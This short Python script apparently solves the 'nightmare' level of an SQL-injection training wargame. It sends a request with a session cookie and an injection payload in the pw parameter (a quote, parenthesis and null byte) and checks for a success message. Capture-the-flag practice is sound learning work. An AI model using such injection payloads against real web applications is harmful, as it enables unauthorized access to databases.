import requests
from dotenv import load_dotenv
import os

load_dotenv()
url=os.environ.get('LOS_URL')+'chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?pw=%27)=0;%00'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "NIGHTMARE Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)